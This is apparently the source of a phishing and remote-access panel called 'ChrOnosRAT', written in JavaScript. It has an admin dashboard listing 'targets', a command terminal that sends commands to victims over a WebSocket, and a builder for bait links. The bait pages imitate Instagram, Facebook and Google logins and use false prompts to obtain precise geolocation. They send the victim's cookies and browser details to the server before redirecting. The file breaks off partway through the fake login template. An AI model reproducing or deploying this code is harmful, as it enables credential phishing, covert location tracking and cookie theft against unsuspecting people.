// api/index.js
import { WebSocketServer } from 'ws';

// ============ IN-MEMORY STORE ============
const store = {
    config: {
        siteName: 'ChrOnosRAT',
        adminCreated: false
    },
    users: [],
    sessions: new Map(),
    targets: new Map(),
    links: new Map(),
    logs: []
};

// ============ UTILS ============
function hashPass(p) {
    return crypto.createHash('sha256').update(p + '_chronos_salt').digest('hex');
}

function genId(prefix = '') {
    return prefix + crypto.randomBytes(4).toString('hex');
}

function genToken() {
    return crypto.randomBytes(32).toString('hex');
}

function auth(headers) {
    const auth = headers['authorization'] || '';
    const token = auth.replace('Bearer ', '');
    if (!token) return null;
    const session = store.sessions.get(token);
    if (!session) return null;
    const user = store.users.find(u => u.id === session.userId);
    if (!user) return null;
    return user;
}

function log(action, userId = 'system', details = '') {
    store.logs.unshift({
        id: genId('LOG'),
        action,
        userId,
        details,
        time: new Date().toISOString()
    });
    if (store.logs.length > 500) store.logs.length = 500;
}

// ============ HTML TEMPLATES ============
function getAdminHTML() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${store.config.siteName} - Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a0f;--surface:#12121a;--surface2:#1a1a25;--border:#2a2a3a;--text:#e0e0e8;--dim:#666680;--accent:#7c3aed;--accent2:#a78bfa;--green:#22c55e;--red:#ef4444;--yellow:#eab308;--blue:#3b82f6}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#0a0a1a,#1a0a2a)}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:40px;width:400px;max-width:90vw}
.login-box h1{color:var(--accent2);text-align:center;margin-bottom:8px;font-size:24px}
.login-box p{color:var(--dim);text-align:center;margin-bottom:30px;font-size:14px}
.login-box input{width:100%;padding:12px 16px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:14px;margin-bottom:12px;outline:none;transition:border .2s}
.login-box input:focus{border-color:var(--accent)}
.login-box button{width:100%;padding:12px;background:var(--accent);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:all .2s}
.login-box button:hover{background:#6d28d9;transform:translateY(-1px)}
.login-box .error{color:var(--red);text-align:center;font-size:13px;margin-top:12px;display:none}
.setup-box{display:none}
.setup-box.active{display:block}
.login-form.active{display:block}
.app{display:none}
.app.active{display:flex;min-height:100vh}
.sidebar{width:260px;background:var(--surface);border-right:1px solid var(--border);padding:20px 0;display:flex;flex-direction:column;position:fixed;height:100vh;overflow-y:auto}
.sidebar .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:10px}
.sidebar .logo h2{color:var(--accent2);font-size:18px}
.sidebar .logo span{color:var(--dim);font-size:12px}
.nav-item{padding:12px 20px;cursor:pointer;color:var(--dim);transition:all .2s;display:flex;align-items:center;gap:10px;font-size:14px}
.nav-item:hover{color:var(--text);background:var(--surface2)}
.nav-item.active{color:var(--accent2);background:rgba(124,58,237,.1);border-right:2px solid var(--accent)}
.nav-item .badge{background:var(--accent);color:#fff;font-size:11px;padding:2px 8px;border-radius:10px;margin-left:auto}
.main{flex:1;margin-left:260px;padding:30px}
.page{display:none}
.page.active{display:block}
.page-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px}
.page-header h1{font-size:22px;color:var(--text)}
.card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:20px}
.card h3{color:var(--text);margin-bottom:15px;font-size:15px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:25px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px}
.stat-card .label{color:var(--dim);font-size:13px;margin-bottom:5px}
.stat-card .value{font-size:28px;font-weight:700}
.stat-card .value.purple{color:var(--accent2)}
.stat-card .value.green{color:var(--green)}
.stat-card .value.blue{color:var(--blue)}
.stat-card .value.yellow{color:var(--yellow)}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:12px;color:var(--dim);font-size:13px;font-weight:500;border-bottom:1px solid var(--border)}
td{padding:12px;border-bottom:1px solid var(--border);font-size:14px}
tr:hover td{background:var(--surface2)}
.btn{padding:8px 16px;border:none;border-radius:8px;font-size:13px;font-weight:500;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--accent);color:#fff}
.btn-primary:hover{background:#6d28d9}
.btn-danger{background:var(--red);color:#fff}
.btn-danger:hover{background:#dc2626}
.btn-success{background:var(--green);color:#fff}
.btn-success:hover{background:#16a34a}
.btn-sm{padding:6px 12px;font-size:12px}
.input{padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:14px;outline:none;width:100%;transition:border .2s}
.input:focus{border-color:var(--accent)}
select.input{cursor:pointer}
.form-group{margin-bottom:15px}
.form-group label{display:block;color:var(--dim);font-size:13px;margin-bottom:6px}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center}
.modal-overlay.active{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:30px;width:500px;max-width:90vw;max-height:90vh;overflow-y:auto}
.modal h2{margin-bottom:20px;color:var(--text)}
.target-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:15px;margin-bottom:12px;cursor:pointer;transition:all .2s}
.target-card:hover{border-color:var(--accent);transform:translateY(-2px)}
.target-card .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.target-card .id{color:var(--accent2);font-weight:600;font-size:14px}
.target-card .status{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:6px}
.target-card .status.online{background:var(--green);box-shadow:0 0 8px var(--green)}
.target-card .status.offline{background:var(--red)}
.target-card .meta{display:flex;gap:15px;flex-wrap:wrap;font-size:12px;color:var(--dim)}
.target-detail{display:none}
.target-detail.active{display:block}
.map-container{width:100%;height:400px;background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
.map-container iframe{width:100%;height:100%;border:none}
.terminal{background:#05050a;border:1px solid var(--border);border-radius:8px;padding:15px;font-family:'Cascadia Code','Fira Code',monospace;font-size:13px;min-height:250px;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.6}
.terminal .cmd{color:var(--green)}
.terminal .out{color:var(--text)}
.terminal .err{color:var(--red)}
.terminal .info{color:var(--blue)}
.cmd-input{display:flex;gap:10px;margin-top:15px}
.cmd-input input{flex:1}
.log-item{padding:10px;border-bottom:1px solid var(--border);font-size:13px;display:flex;gap:15px}
.log-item .time{color:var(--dim);min-width:140px}
.log-item .action{color:var(--accent2);min-width:100px}
.link-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:15px;margin-bottom:12px}
.link-card .url{background:var(--bg);padding:8px 12px;border-radius:6px;font-family:monospace;font-size:13px;word-break:break-all;margin:10px 0;cursor:pointer}
.link-card .url:hover{background:var(--surface2)}
.empty{text-align:center;padding:40px;color:var(--dim)}
.empty .icon{font-size:48px;margin-bottom:15px}
.toast{position:fixed;top:20px;right:20px;background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:15px 20px;z-index:200;transform:translateX(400px);transition:transform .3s;font-size:14px;max-width:350px}
.toast.show{transform:translateX(0)}
.toast.success{border-left:3px solid var(--green)}
.toast.error{border-left:3px solid var(--red)}
.user-avatar{width:32px;height:32px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;font-weight:600;font-size:13px;color:#fff}
@media(max-width:768px){.sidebar{display:none}.main{margin-left:0}}
</style>
</head>
<body>

<div id="loginPage" class="login-wrap">
  <div class="login-box">
    <div id="setupBox" class="setup-box">
      <h1>🚀 Setup</h1>
      <p>Create admin account to get started</p>
      <input type="text" id="setupUser" placeholder="Username">
      <input type="password" id="setupPass" placeholder="Password">
      <input type="password" id="setupPass2" placeholder="Confirm Password">
      <button onclick="doSetup()">Create Admin</button>
      <div class="error" id="setupError"></div>
    </div>
    <div id="loginForm" class="login-form" style="display:none">
      <h1>🔐 Login</h1>
      <p>${store.config.siteName} Admin Panel</p>
      <input type="text" id="loginUser" placeholder="Username">
      <input type="password" id="loginPass" placeholder="Password">
      <button onclick="doLogin()">Login</button>
      <div class="error" id="loginError"></div>
    </div>
  </div>
</div>

<div id="app" class="app">
  <div class="sidebar">
    <div class="logo">
      <h2>⏳ ${store.config.siteName}</h2>
      <span>Control Panel v1.0</span>
    </div>
    <div class="nav-item active" onclick="showPage('dashboard')">📊 Dashboard</div>
    <div class="nav-item" onclick="showPage('targets')">🎯 Targets <span class="badge" id="targetBadge">0</span></div>
    <div class="nav-item" onclick="showPage('links')">🔗 Tracking Links</div>
    <div class="nav-item" onclick="showPage('users')">👥 Users</div>
    <div class="nav-item" onclick="showPage('logs')">📝 Activity Log</div>
    <div class="nav-item" onclick="showPage('settings')">⚙️ Settings</div>
    <div style="flex:1"></div>
    <div class="nav-item" onclick="doLogout()" style="color:var(--red)">🚪 Logout</div>
  </div>
  <div class="main">
    
    <!-- DASHBOARD -->
    <div id="page-dashboard" class="page active">
      <div class="page-header"><h1>Dashboard</h1><span id="clockDisplay" style="color:var(--dim);font-size:13px"></span></div>
      <div class="stats">
        <div class="stat-card"><div class="label">Total Targets</div><div class="value purple" id="statTargets">0</div></div>
        <div class="stat-card"><div class="label">Online Now</div><div class="value green" id="statOnline">0</div></div>
        <div class="stat-card"><div class="label">Tracking Links</div><div class="value blue" id="statLinks">0</div></div>
        <div class="stat-card"><div class="label">Total Visits</div><div class="value yellow" id="statVisits">0</div></div>
      </div>
      <div class="card">
        <h3>Recent Activity</h3>
        <div id="recentLogs"></div>
      </div>
    </div>

    <!-- TARGETS -->
    <div id="page-targets" class="page">
      <div class="page-header"><h1>Targets</h1><button class="btn btn-primary" onclick="refreshTargets()">↻ Refresh</button></div>
      <div id="targetList"></div>
      <div id="targetDetail" class="target-detail">
        <button class="btn btn-sm" onclick="hideTargetDetail()" style="margin-bottom:15px">← Back to List</button>
        <div class="page-header"><h1 id="detailTitle">Target Detail</h1></div>
        <div class="map-container" id="detailMap"></div>
        <div class="stats" id="detailStats"></div>
        <div class="card">
          <h3>Browser Information</h3>
          <div id="detailBrowser" class="terminal" style="min-height:auto"></div>
        </div>
        <div class="card">
          <h3>Location Data</h3>
          <div id="detailLocation" class="terminal" style="min-height:auto"></div>
        </div>
        <div class="card">
          <h3>Visit History</h3>
          <table><thead><tr><th>Time</th><th>Page</th><th>IP</th></tr></thead><tbody id="detailVisits"></tbody></table>
        </div>
        <div class="card">
          <h3>Send Command</h3>
          <div class="terminal" id="cmdOutput"><span class="info">Waiting for commands...</span></div>
          <div class="cmd-input">
            <input class="input" id="cmdInput" placeholder="Enter command..." onkeypress="if(event.key==='Enter')sendCmd()">
            <button class="btn btn-primary" onclick="sendCmd()">Send</button>
          </div>
        </div>
      </div>
    </div>

    <!-- LINKS -->
    <div id="page-links" class="page">
      <div class="page-header"><h1>Tracking Links</h1><button class="btn btn-primary" onclick="showModal('linkModal')">+ New Link</button></div>
      <div id="linkList"></div>
    </div>

    <!-- USERS -->
    <div id="page-users" class="page">
      <div class="page-header"><h1>Users</h1><button class="btn btn-primary" onclick="showModal('userModal')">+ Add User</button></div>
      <div class="card">
        <table><thead><tr><th>User</th><th>Role</th><th>Created</th><th>Last Login</th><th>Actions</th></tr></thead><tbody id="userTable"></tbody></table>
      </div>
    </div>

    <!-- LOGS -->
    <div id="page-logs" class="page">
      <div class="page-header"><h1>Activity Log</h1><button class="btn btn-sm" onclick="loadLogs()">↻ Refresh</button></div>
      <div class="card"><div id="logList"></div></div>
    </div>

    <!-- SETTINGS -->
    <div id="page-settings" class="page">
      <div class="page-header"><h1>Settings</h1></div>
      <div class="card">
        <h3>Site Configuration</h3>
        <div class="form-group"><label>Site Name</label><input class="input" id="settingName" value="${store.config.siteName}"></div>
        <button class="btn btn-primary" onclick="saveSettings()">Save Changes</button>
      </div>
    </div>

  </div>
</div>

<!-- MODALS -->
<div id="linkModal" class="modal-overlay" onclick="if(event.target===this)hideModal('linkModal')">
  <div class="modal">
    <h2>🔗 Create Tracking Link</h2>
    <div class="form-group"><label>Link Name</label><input class="input" id="linkName" placeholder="e.g., Instagram Clone"></div>
    <div class="form-group"><label>Redirect URL (after grab)</label><input class="input" id="linkRedirect" placeholder="https://instagram.com"></div>
    <div class="form-group"><label>Custom Slug (optional)</label><input class="input" id="linkSlug" placeholder="my-custom-link"></div>
    <div class="form-group"><label>Bait Page Style</label>
      <select class="input" id="linkStyle">
        <option value="instagram">Instagram Login</option>
        <option value="facebook">Facebook Login</option>
        <option value="google">Google Login</option>
        <option value="location">Location Request (Maps)</option>
        <option value="custom">Custom (just track)</option>
      </select>
    </div>
    <button class="btn btn-primary" onclick="createLink()">Generate Link</button>
  </div>
</div>

<div id="userModal" class="modal-overlay" onclick="if(event.target===this)hideModal('userModal')">
  <div class="modal">
    <h2>👤 Add User</h2>
    <div class="form-group"><label>Username</label><input class="input" id="newUser"></div>
    <div class="form-group"><label>Password</label><input class="input" type="password" id="newPass"></div>
    <div class="form-group"><label>Role</label>
      <select class="input" id="newRole"><option value="admin">Admin</option><option value="viewer">Viewer</option></select>
    </div>
    <button class="btn btn-primary" onclick="createUser()">Create User</button>
  </div>
</div>

<div id="toast" class="toast"></div>

<script>
let token = localStorage.getItem('chronos_token');
let ws = null;
let currentTarget = null;
let reconnectTimer = null;

// ============ INIT ============
window.onload = () => {
    checkAuth();
    startClock();
};

function startClock() {
    const el = document.getElementById('clockDisplay');
    if(el) setInterval(() => el.textContent = new Date().toLocaleString(), 1000);
}

// ============ AUTH ============
async function checkAuth() {
    if (!token) { showLoginPage(); return; }
    try {
        const r = await api('/api/me');
        if (r.ok) { showApp(); connectWS(); } else { showLoginPage(); }
    } catch { showLoginPage(); }
}

async function doSetup() {
    const u = document.getElementById('setupUser').value.trim();
    const p = document.getElementById('setupPass').value;
    const p2 = document.getElementById('setupPass2').value;
    if (!u || !p) return showError('setupError', 'Fill all fields');
    if (p !== p2) return showError('setupError', 'Passwords dont match');
    const r = await api('/api/setup', 'POST', { username: u, password: p });
    if (r.ok) { token = r.token; localStorage.setItem('chronos_token', token); showApp(); connectWS(); }
    else showError('setupError', r.error || 'Failed');
}

async function doLogin() {
    const u = document.getElementById('loginUser').value.trim();
    const p = document.getElementById('loginPass').value;
    if (!u || !p) return showError('loginError', 'Fill all fields');
    const r = await api('/api/login', 'POST', { username: u, password: p });
    if (r.ok) { token = r.token; localStorage.setItem('chronos_token', token); showApp(); connectWS(); }
    else showError('loginError', r.error || 'Invalid credentials');
}

function doLogout() {
    token = null;
    localStorage.removeItem('chronos_token');
    if (ws) ws.close();
    showLoginPage();
}

function showLoginPage() {
    document.getElementById('loginPage').style.display = '';
    document.getElementById('app').classList.remove('active');
    checkSetup();
}

async function checkSetup() {
    const r = await api('/api/setup-status');
    if (r.setup) {
        document.getElementById('setupBox').classList.remove('active');
        document.getElementById('loginForm').style.display = 'block';
    } else {
        document.getElementById('setupBox').classList.add('active');
        document.getElementById('loginForm').style.display = 'none';
    }
}

function showApp() {
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('app').classList.add('active');
    loadDashboard();
}

// ============ API ============
async function api(path, method = 'GET', body = null) {
    const opts = { method, headers: { 'Content-Type': 'application/json' } };
    if (token) opts.headers['Authorization'] = 'Bearer ' + token;
    if (body) opts.body = JSON.stringify(body);
    try {
        const r = await fetch(path, opts);
        return await r.json();
    } catch { return { ok: false, error: 'Network error' }; }
}

// ============ WEBSOCKET ============
function connectWS() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(proto + '//' + location.host + '/api/ws');
    ws.onopen = () => console.log('[WS] Connected');
    ws.onmessage = (e) => {
        const d = JSON.parse(e.data);
        if (d.type === 'target_update') { refreshTargets(); updateStats(); }
        if (d.type === 'cmd_result' && currentTarget === d.targetId) {
            const el = document.getElementById('cmdOutput');
            el.innerHTML += '<span class="out">' + escapeHtml(d.output) + '</span>\\n';
            el.scrollTop = el.scrollHeight;
        }
        if (d.type === 'new_visit') { refreshTargets(); loadLinks(); updateStats(); }
        if (d.type === 'log') { loadLogs(); }
    };
    ws.onclose = () => { clearTimeout(reconnectTimer); reconnectTimer = setTimeout(connectWS, 3000); };
}

function wsSend(data) {
    if (ws && ws.readyState === 1) ws.send(JSON.stringify(data));
}

// ============ PAGES ============
function showPage(name) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('page-' + name).classList.add('active');
    event.target.closest('.nav-item').classList.add('active');
    if (name === 'dashboard') loadDashboard();
    if (name === 'targets') refreshTargets();
    if (name === 'links') loadLinks();
    if (name === 'users') loadUsers();
    if (name === 'logs') loadLogs();
}

async function loadDashboard() {
    const r = await api('/api/stats');
    if (!r.ok) return;
    document.getElementById('statTargets').textContent = r.totalTargets || 0;
    document.getElementById('statOnline').textContent = r.onlineTargets || 0;
    document.getElementById('statLinks').textContent = r.totalLinks || 0;
    document.getElementById('statVisits').textContent = r.totalVisits || 0;
    document.getElementById('targetBadge').textContent = r.onlineTargets || 0;
    const logs = await api('/api/logs?limit=10');
    if (logs.ok) renderRecentLogs(logs.logs);
}

async function updateStats() {
    const r = await api('/api/stats');
    if (!r.ok) return;
    document.getElementById('statTargets').textContent = r.totalTargets || 0;
    document.getElementById('statOnline').textContent = r.onlineTargets || 0;
    document.getElementById('statLinks').textContent = r.totalLinks || 0;
    document.getElementById('statVisits').textContent = r.totalVisits || 0;
    document.getElementById('targetBadge').textContent = r.onlineTargets || 0;
}

// ============ TARGETS ============
async function refreshTargets() {
    const r = await api('/api/targets');
    if (!r.ok) return;
    const el = document.getElementById('targetList');
    if (!r.targets.length) { el.innerHTML = '<div class="empty"><div class="icon">🎯</div>No targets yet. Create a tracking link first.</div>'; return; }
    el.innerHTML = r.targets.map(t => \`
        <div class="target-card" onclick="showTargetDetail('\${t.id}')">
            <div class="header">
                <span class="id"><span class="status \${t.online ? 'online' : 'offline'}"></span>\${t.id}</span>
                <span style="color:var(--dim);font-size:12px">\${timeAgo(t.lastSeen)}</span>
            </div>
            <div class="meta">
                <span>📍 \${t.location?.city || 'Unknown'}, \${t.location?.country || '?'}</span>
                <span>💻 \${t.browser?.os || 'Unknown'}</span>
                <span>👁 \${t.visits || 0} visits</span>
            </div>
        </div>
    \`).join('');
}

async function showTargetDetail(id) {
    currentTarget = id;
    const r = await api('/api/targets/' + id);
    if (!r.ok) return;
    const t = r.target;
    document.getElementById('targetList').style.display = 'none';
    document.getElementById('targetDetail').classList.add('active');
    document.getElementById('detailTitle').textContent = 'Target: ' + id;
    document.getElementById('cmdOutput').innerHTML = '<span class="info">Connected to ' + id + '</span>\\n';
    
    // Map
    if (t.location?.lat && t.location?.lon) {
        document.getElementById('detailMap').innerHTML = \`<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=\${t.location.lon-0.05},\${t.location.lat-0.05},\${t.location.lon+0.05},\${t.location.lat+0.05}&layer=mapnik&marker=\${t.location.lat},\${t.location.lon}" style="width:100%;height:100%;border:none"></iframe>\`;
    } else {
        document.getElementById('detailMap').innerHTML = '<div class="empty"><div class="icon">🗺️</div>No location data</div>';
    }

    // Stats
    document.getElementById('detailStats').innerHTML = \`
        <div class="stat-card"><div class="label">Status</div><div class="value \${t.online?'green':'red'}" style="font-size:20px">\${t.online?'ONLINE':'OFFLINE'}</div></div>
        <div class="stat-card"><div class="label">IP Address</div><div class="value purple" style="font-size:18px">\${t.ip || 'N/A'}</div></div>
        <div class="stat-card"><div class="label">Visits</div><div class="value blue" style="font-size:20px">\${t.visits || 0}</div></div>
        <div class="stat-card"><div class="label">First Seen</div><div class="value yellow" style="font-size:14px">\${t.firstSeen ? new Date(t.firstSeen).toLocaleString() : 'N/A'}</div></div>
    \`;

    // Browser
    document.getElementById('detailBrowser').textContent = JSON.stringify(t.browser || {}, null, 2);
    document.getElementById('detailLocation').textContent = JSON.stringify(t.location || {}, null, 2);

    // Visits
    const visits = (t.visitHistory || []).map(v => \`<tr><td>\${new Date(v.time).toLocaleString()}</td><td>\${v.page || '-'}</td><td>\${v.ip || '-'}</td></tr>\`).join('');
    document.getElementById('detailVisits').innerHTML = visits || '<tr><td colspan="3" style="color:var(--dim);text-align:center">No visits recorded</td></tr>';
}

function hideTargetDetail() {
    currentTarget = null;
    document.getElementById('targetList').style.display = '';
    document.getElementById('targetDetail').classList.remove('active');
}

function sendCmd() {
    const input = document.getElementById('cmdInput');
    const cmd = input.value.trim();
    if (!cmd || !currentTarget) return;
    const el = document.getElementById('cmdOutput');
    el.innerHTML += '<span class="cmd">$ ' + escapeHtml(cmd) + '</span>\\n';
    wsSend({ type: 'cmd', targetId: currentTarget, command: cmd });
    input.value = '';
}

// ============ LINKS ============
async function loadLinks() {
    const r = await api('/api/links');
    if (!r.ok) return;
    const el = document.getElementById('linkList');
    if (!r.links.length) { el.innerHTML = '<div class="empty"><div class="icon">🔗</div>No tracking links yet</div>'; return; }
    el.innerHTML = r.links.map(l => \`
        <div class="link-card">
            <div style="display:flex;justify-content:space-between;align-items:center">
                <strong>\${escapeHtml(l.name)}</strong>
                <span style="color:var(--dim);font-size:12px">\${l.style} | \${l.visits || 0} visits</span>
            </div>
            <div class="url" onclick="copyText('\${location.origin}/\${l.slug}')" title="Click to copy">\${location.origin}/\${l.slug}</div>
            <div style="display:flex;gap:8px">
                <button class="btn btn-sm btn-danger" onclick="deleteLink('\${l.id}')">Delete</button>
            </div>
        </div>
    \`).join('');
}

async function createLink() {
    const name = document.getElementById('linkName').value.trim();
    const redirect = document.getElementById('linkRedirect').value.trim();
    const slug = document.getElementById('linkSlug').value.trim();
    const style = document.getElementById('linkStyle').value;
    if (!name) return toast('Name is required', 'error');
    const r = await api('/api/links', 'POST', { name, redirect, slug, style });
    if (r.ok) { hideModal('linkModal'); loadLinks(); updateStats(); toast('Link created!', 'success'); }
    else toast(r.error || 'Failed', 'error');
}

async function deleteLink(id) {
    if (!confirm('Delete this link?')) return;
    await api('/api/links/' + id, 'DELETE');
    loadLinks(); updateStats();
}

// ============ USERS ============
async function loadUsers() {
    const r = await api('/api/users');
    if (!r.ok) return;
    document.getElementById('userTable').innerHTML = r.users.map(u => \`
        <tr>
            <td><div style="display:flex;align-items:center;gap:10px"><div class="user-avatar">\${u.username[0].toUpperCase()}</div>\${escapeHtml(u.username)}</div></td>
            <td>\${u.role}</td>
            <td>\${new Date(u.created).toLocaleDateString()}</td>
            <td>\${u.lastLogin ? new Date(u.lastLogin).toLocaleString() : 'Never'}</td>
            <td>\${u.role !== 'owner' ? '<button class="btn btn-sm btn-danger" onclick="deleteUser(\\'' + u.id + '\\')">Delete</button>' : '<span style="color:var(--dim)">Owner</span>'}</td>
        </tr>
    \`).join('');
}

async function createUser() {
    const username = document.getElementById('newUser').value.trim();
    const password = document.getElementById('newPass').value;
    const role = document.getElementById('newRole').value;
    if (!username || !password) return toast('Fill all fields', 'error');
    const r = await api('/api/users', 'POST', { username, password, role });
    if (r.ok) { hideModal('userModal'); loadUsers(); toast('User created!', 'success'); }
    else toast(r.error || 'Failed', 'error');
}

async function deleteUser(id) {
    if (!confirm('Delete this user?')) return;
    await api('/api/users/' + id, 'DELETE');
    loadUsers();
}

// ============ LOGS ============
async function loadLogs() {
    const r = await api('/api/logs?limit=50');
    if (!r.ok) return;
    document.getElementById('logList').innerHTML = r.logs.map(l => \`
        <div class="log-item">
            <span class="time">\${new Date(l.time).toLocaleString()}</span>
            <span class="action">\${l.action}</span>
            <span>\${escapeHtml(l.details || '')}</span>
        </div>
    \`).join('') || '<div class="empty">No logs yet</div>';
}

function renderRecentLogs(logs) {
    document.getElementById('recentLogs').innerHTML = logs.map(l => \`
        <div class="log-item">
            <span class="time">\${new Date(l.time).toLocaleString()}</span>
            <span class="action">\${l.action}</span>
            <span>\${escapeHtml(l.details || '')}</span>
        </div>
    \`).join('') || '<div class="empty">No activity yet</div>';
}

// ============ SETTINGS ============
async function saveSettings() {
    const name = document.getElementById('settingName').value.trim();
    if (!name) return;
    const r = await api('/api/settings', 'POST', { siteName: name });
    if (r.ok) { toast('Settings saved!', 'success'); setTimeout(() => location.reload(), 1000); }
    else toast(r.error || 'Failed', 'error');
}

// ============ HELPERS ============
function showModal(id) { document.getElementById(id).classList.add('active'); }
function hideModal(id) { document.getElementById(id).classList.remove('active'); }
function showError(id, msg) { const el = document.getElementById(id); el.textContent = msg; el.style.display = 'block'; setTimeout(() => el.style.display = 'none', 3000); }
function toast(msg, type = 'success') { const el = document.getElementById('toast'); el.textContent = msg; el.className = 'toast ' + type + ' show'; setTimeout(() => el.classList.remove('show'), 3000); }
function escapeHtml(s) { if (!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function copyText(t) { navigator.clipboard.writeText(t); toast('Copied!', 'success'); }
function timeAgo(ts) { if (!ts) return 'Never'; const s = Math.floor((Date.now() - new Date(ts)) / 1000); if (s < 60) return s + 's ago'; if (s < 3600) return Math.floor(s/60) + 'm ago'; if (s < 86400) return Math.floor(s/3600) + 'h ago'; return Math.floor(s/86400) + 'd ago'; }
</script>
</body>
</html>`;
}

function getBaitHTML(link) {
    const styles = `
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center}
    .card{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:40px;width:350px;text-align:center}
    .logo{font-size:48px;margin-bottom:20px}
    input{width:100%;padding:10px 12px;border:1px solid #dbdbdb;border-radius:4px;margin-bottom:10px;font-size:14px;outline:none;background:#fafafa}
    input:focus{border-color:#a8a8a8}
    button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
    button:hover{background:#1877f2}
    .or{display:flex;align-items:center;margin:15px 0;color:#8e8e8e;font-size:13px}
    .or::before,.or::after{content:'';flex:1;height:1px;background:#dbdbdb}
    .or span{padding:0 15px}
    .fb{background:#1877f2}
    .signup{margin-top:15px;padding:15px;background:#fff;border:1px solid #dbdbdb;border-radius:8px;font-size:14px;color:#8e8e8e}
    .signup a{color:#0095f6;text-decoration:none;font-weight:600}
    .loading{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:99;align-items:center;justify-content:center;flex-direction:column}
    .loading.active{display:flex}
    .spinner{width:40px;height:40px;border:3px solid #eee;border-top-color:#0095f6;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:15px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .loc-modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:100;align-items:center;justify-content:center}
    .loc-modal.active{display:flex}
    .loc-card{background:#fff;border-radius:12px;padding:30px;text-align:center;max-width:350px;width:90%}
    .loc-card h3{margin:15px 0 10px;font-size:18px}
    .loc-card p{color:#666;font-size:14px;margin-bottom:20px}
    .loc-card button{background:#0095f6}
    `;

    const locScript = `
    function requestLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }
    async function getLocation() {
        document.getElementById('locModal').classList.add('active');
        const loc = await requestLocation();
        document.getElementById('locModal').classList.remove('active');
        return loc;
    }
    `;

    if (link.style === 'location') {
        return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Open Maps</title><style>${styles}</style></head><body>
        <div class="loading" id="loading"><div class="spinner"></div><div>Loading map...</div></div>
        <div class="loc-modal" id="locModal"><div class="loc-card">📍<h3>Location Access</h3><p>This map needs your location to show nearby places</p><button onclick="this.parentElement.parentElement.style.display='none'">Allow Location</button></div></div>
        <script>${locScript}
        async function init() {
            const loc = await getLocation();
            const data = { type: 'visit', linkId: '${link.id}', location: loc, browser: getBrowserInfo() };
            fetch('/api/track', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            document.getElementById('loading').classList.add('active');
            setTimeout(() => window.location.href = '${link.redirect || 'https://maps.google.com'}', 2000);
        }
        function getBrowserInfo(){return{ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,cookies:document.cookie}}
        init();
        <\/script></body></html>`;
    }

    const brandConfigs = {
        instagram: { logo: '📸', title: 'Instagram', color: '#0095f6', signup: "Don't have an account? <a href='#'>Sign up</a>" },
        facebook: { logo: '📘', title: 'Facebook', color: '#1877f2', fb: true, signup: "Don't have an account? <a href='#'>Sign up</a>" },
        google: { logo: '🔵', title: 'Sign in', color: '#1a73e8', signup: "Create account", google: true }
    };
    const brand = brandConfigs[link.style] || brandConfigs.instagram;

    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${brand.title}</title><style>${styles}</style></head><body>
    <div class="loc-modal" id="locModal"><div class="loc-card">🔒<h3>Security Check</h3><p>Please allow location to verify your identity</p><button onclick="this.parentElement.parentElement.style.display='none'">Continue</button></div></div>
